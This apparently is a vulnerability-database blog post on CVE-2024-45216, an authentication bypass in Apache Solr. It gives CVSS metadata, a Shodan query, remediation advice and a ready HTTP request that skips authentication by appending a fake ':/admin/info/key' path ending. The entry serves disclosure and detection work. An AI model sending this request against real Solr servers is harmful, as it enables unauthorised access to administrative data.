---
layout: post
cve_id: CVE-2024-45216
title: Apache Solr - Authentication Bypass
pcap: true
pcap_path: /pcaps/2024/CVE-2024-45216.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-45216.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gumgum
severity: critical
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'Users are recommended to upgrade to version 9.7.0, or 8.11.4, which fix the
  issue.

  '
reference:
- https://shfsec.com/cve-2024-45216-authentication-bypass-in-apache-solr
- https://nvd.nist.gov/vuln/detail/CVE-2024-45216
- https://solr.apache.org/security html#cve-2024-45216-apache-solr-authentication-bypass-possible-using-a-fake-url-path-ending
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-45216
  cwe-id: CWE-863,CWE-287
  epss-score: 0.9408
  epss-percentile: 0.99899
metadata:
  verified: true
  max-request: 1
  shodan-query: http.html:"Apache Solr"
tags:
- cve
- cve2024
- apache
- solr
- auth-bypass
- vuln
- vkev
---

## üîç Vulnerability Description
Solr instances using the PKIAuthenticationPlugin, which is enabled by default when Solr Authentication is used, are vulnerable to Authentication bypass.A fake ending at the end of any Solr API URL path, will allow requests to skip Authentication while maintaining the API contract with the original URL Path.This fake ending looks like an unprotected API path, however it is stripped off internally after authentication but before API routing.This issue affects Apache Solr- from 5.3.0 before 8.11.4, from 9.0.0 before 9.7.0.


## üåê HTTP Request
```nohighlight
GET /solr/admin/info/properties:/admin/info/key HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Connection: close
SolrAuth: ceata
Accept-Encoding: gzip
```

